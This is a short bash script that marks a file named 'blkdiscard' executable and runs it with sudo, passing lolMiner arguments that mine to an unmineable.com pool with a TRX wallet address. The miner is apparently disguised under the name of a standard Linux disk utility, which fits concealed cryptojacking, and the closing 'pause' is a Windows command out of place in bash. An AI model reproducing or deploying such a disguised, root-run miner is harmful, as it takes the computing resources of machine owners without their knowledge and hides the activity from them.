#!/bin/bash

cd "$(dirname "$0")"

chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUVKgSFJWkYn4UBPjX1xPzxADUFGk3McXo.$(echo $(shuf -i 1-1000 -n 1)-joa) --ethstratum ETHPROXY
pause
